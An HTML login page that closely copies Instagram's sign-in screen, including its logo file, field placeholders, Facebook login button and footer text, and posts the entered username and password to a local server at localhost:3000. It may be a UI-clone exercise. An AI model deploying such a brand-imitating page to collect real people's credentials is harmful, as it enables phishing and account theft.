<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="style.css"> <!-- Link to your CSS file -->
</head>
<body>
  <div class="login-page">
    <div class="login-container">
      <div class="logo">
        <!-- Placeholder for Logo -->
        <img src="public/images/iglogo.png" alt="Logo">
      </div>

      <form id="loginForm" class="login-form" action="http://localhost:3000/login" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>

      <div class="divider">OR</div>
      <div class="log-in-text">
       <button class="fb-login">
        <img width="16" height="auto" src="images/fblogo.png" alt="Facebook Icon">
        Log in with Facebook
      </button>

      </div>


     
      <a href="#" class="forgot-password">Forgot password?</a>
      <div style="font-size: 12px;margin-top:40px; color:#808080;">
     You can also
      <a style="font-size: 12px;color:#385185;"> report content you believe is unlawful</a>
       in your country without logging in.
      </div>
      
       
    
    </div>
    
    <div class="donthaveacc">
      <div class="signup">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>
</div>

  <script src="public/main.js"></script>
</body>

</html>
